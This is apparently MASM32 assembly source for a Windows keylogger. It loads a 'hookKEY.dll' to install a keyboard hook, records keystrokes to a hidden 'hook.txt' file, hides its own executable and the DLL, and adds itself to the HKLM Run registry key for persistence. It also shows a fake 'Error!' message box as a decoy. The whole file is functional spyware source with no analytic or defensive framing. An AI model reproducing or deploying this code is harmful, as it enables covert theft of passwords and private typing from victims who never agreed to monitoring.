.386
.model flat,stdcall
option casemap:none

    include D:\masm32\INCLUDE\WINDOWS.INC
    include D:\masm32\INCLUDE\KERNEL32.INC
    include D:\masm32\INCLUDE\USER32.INC
    include D:\masm32\INCLUDE\SHELL32.INC
    include D:\masm32\INCLUDE\ADVAPI32.INC
    include D:\masm32\INCLUDE\GDI32.INC
    include D:\masm32\INCLUDE\comdlg32.inc
    include my.inc

    includelib D:\masm32\lib\masm32.lib
    includelib D:\MASM32\LIB\ole32.lib
    includelib D:\masm32\lib\comdlg32
    includelib D:\masm32\lib\user32.lib
    includelib D:\masm32\lib\shell32.lib
    includelib D:\masm32\lib\gdi32.lib
    includelib D:\masm32\lib\kernel32.lib
    includelib D:\masm32\lib\user32.lib
    includelib D:\masm32\lib\advapi32.lib

public HINST

MAIN_WINDOW_PROC PROTO  :DWORD ,  :DWORD , :DWORD ,  :DWORD

.data
	HINST        DWORD NULL
	HWND_WIN     DWORD NULL

	String_CLASS DB    "VarianT",0
	MSG_WIN      MSG   <0>

	Name_DLL     DB   "hookKEY.dll",0
	FileName     DB   "hook.txt",0
	H_DLL        DD    NULL
	mes          db   "Error!",0

	Name_SetHookFUNC      DB     "_DLL_SET_HOOK_proc@4",0
	Name_UnSetHookFUNC    DB     "_DLL_UNSET_HOOK_proc@0",0
	DLL_SET_HOOK_Func     DWORD  NULL
	DLL_UNSET_HOOK_Func   DWORD  NULL

	hFile dd ?
	tempBuffer dw ?

	buffer  db 1024 dup (NULL)
	buffer2 db "C:\windowss.exe",0
	buffer3 db "C:\hookKEY.dll",0
	buffer4 db 1024 dup (NULL)

	file_name db "Load_DLL_hook.exe",0
	SubKey1   db "Software\Microsoft\Windows\CurrentVersion\Run",0

	HKey      dd ?
	namebuf   db MAX_PATH dup(?)
	wc        WNDCLASSEX  <0>


.code

START:
				xor EAX,EAX

				push Null
          call GetModuleHandle
          mov HINST, EAX

          call MY_REGISTER_CLASS
          cmp EAX, null
          je EXIT

				push	 NULL
				push	HINST
				push	NULL
				push	NULL
				push	100
				push	100
				push	100
				push	100
				push	WS_OVERLAPPEDWINDOW
				push offset String_CLASS
				push	offset String_CLASS
				push	WS_EX_TOPMOST
				call	CreateWindowEx

        mov HWND_WIN , EAX

MSG_LOOP:
         push null
			   push null
			   push null
			   push offset MSG_WIN
			   call GetMessage

			   CMP EAX, FALSE
		     JE EXIT

			   push offset MSG_WIN
			   call TranslateMessage

			   push offset MSG_WIN
			   call DispatchMessage

	      JMP MSG_LOOP

EXIT:
			push Null
			call ExitProcess

MY_REGISTER_CLASS PROC

      mov wc.cbSize, sizeof WNDCLASSEX
      mov wc.style, CS_DBLCLKS
      mov wc.lpfnWndProc, MAIN_WINDOW_PROC
      mov wc.cbClsExtra, NULL
      mov wc.cbWndExtra, NULL
      mov EAX, HINST
      mov wc.hInstance, EAX
      mov wc.lpszMenuName, NULL
      mov wc.lpszClassName, offset String_CLASS

	  push 8190
	  push HINST
    call LoadIcon	         ;load Icon

    mov wc.hIcon, EAX
    mov wc.hIconSm, EAX

	  push IDC_ARROW
	  push NULL
    call LoadCursor

    mov wc.hCursor, EAX

	  push offset wc
	  call RegisterClassExA

ret
MY_REGISTER_CLASS ENDP


MAIN_WINDOW_PROC     PROC   USES  EBX   ESI  EDI  \
                  	 hWnd_  :DWORD, MESG :DWORD, wParam :DWORD, lParam:DWORD


                    CMP MESG, WM_CREATE
                    JE WMCREATE
                    CMP MESG, WM_DESTROY
                    JE WMDESTROY
                    CMP MESG, WM_NULL
                    JE WMNULL

DEF_:
			push 	lParam
			push	wParam
			push	MESG
			push   hWnd_
            call DefWindowProc

            jmp FINISH

WMNULL:
					push  lParam
					push  wParam
					push  WM_CHAR
					push  3
					push  hWnd_
                    call SendDlgItemMessage

                    and wParam, 000000FFh

					push  NULL
					push  wParam
					push  2
					push  hWnd_
                    call SetDlgItemInt

					xor	eax,eax

					push 0
					push 0
					push OPEN_ALWAYS
					push NULL
					push FILE_SHARE_READ or FILE_SHARE_WRITE
					push GENERIC_READ or GENERIC_WRITE
					push OFFSET FileName
					call CreateFile

					mov hFile, eax

					push FILE_END
					push 0
					push 0
					push hFile
					call SetFilePointer

					lea eax, wParam
					push eax
					call	lstrlen
					mov	edx, eax

					lea eax, wParam
					push NULL
					push offset tempBuffer
					push edx
					push eax
					push hFile
					call	WriteFile

					push hFile
					call	CloseHandle

  				push FILE_ATTRIBUTE_HIDDEN
  				push offset buffer4
  				call SetFileAttributes

           jmp FINISH
WMCREATE:

			push offset HKey
			push offset SubKey1
			push HKEY_LOCAL_MACHINE
			call RegCreateKey

			push MAX_PATH
			push offset namebuf
			push 0
			call GetModuleFileName

			push eax
			push offset namebuf
			push REG_SZ
			push 0
			push offset file_name
			push HKey
			call RegSetValueEx

			push HKey
			call RegCloseKey


			push sizeof buffer
			lea ebx,buffer
			push ebx
			push HINST
			call GetModuleFileName

			push FILE_ATTRIBUTE_HIDDEN
			push offset buffer
			call SetFileAttributes

			push MB_OK
			push offset String_CLASS
			push offset mes
			push NULL
			call MessageBox

					xor ecx,ecx
					xor edx,edx

					mov ecx, 1024
					go:
					 cmp buffer[ecx],NULL
					 JE nextt
					 mov buffer[ecx],NULL
					 inc edx

					cmp edx,18
					je endd

					nextt:
					loop go
				endd:

				push offset buffer
				push offset buffer4
				call lstrcat

				push offset FileName
				push offset buffer4
				call lstrcat

				push offset Name_DLL
				push offset buffer
				call lstrcat

				push FILE_ATTRIBUTE_HIDDEN
				push offset buffer
				call SetFileAttributes

				push offset Name_DLL
  	            call LoadLibrary
                mov H_DLL, EAX

				push   offset Name_SetHookFUNC
				push   H_DLL
                call GetProcAddress
                mov DLL_SET_HOOK_Func, EAX


				push offset Name_UnSetHookFUNC
				push H_DLL
                call GetProcAddress
                mov  DLL_UNSET_HOOK_Func, EAX


				PUSH hWnd_
                mov EAX, DLL_SET_HOOK_Func
                CALL EAX
            jmp FINISH
WMDESTROY:
                mov EAX, DLL_UNSET_HOOK_Func
                CALL EAX

                push False
                call PostQuitMessage

FINISH:
RET 16
MAIN_WINDOW_PROC ENDP

END START
